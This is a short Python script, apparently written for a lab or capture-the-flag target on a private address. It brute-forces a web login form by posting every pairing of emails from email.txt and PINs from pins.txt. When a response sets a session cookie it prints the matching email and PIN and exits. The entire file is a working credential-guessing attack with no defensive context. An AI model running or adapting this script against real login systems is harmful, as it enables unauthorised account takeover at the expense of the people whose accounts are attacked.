import requests
import sys

url = 'http://192.168.93.138:5000/login'
with open('email.txt') as mail:
	for e in mail:
		with open('pins.txt') as pins:
			for p in pins: 
				user = {"email":e.strip(),"pin":p.strip()}
				x = requests.post(url, data = user) 
				print(x.status_code)
				if len(x.cookies) == 1:
					print("Email : " + e.strip())
					print("Pins : " + p.strip())
					sys.exit()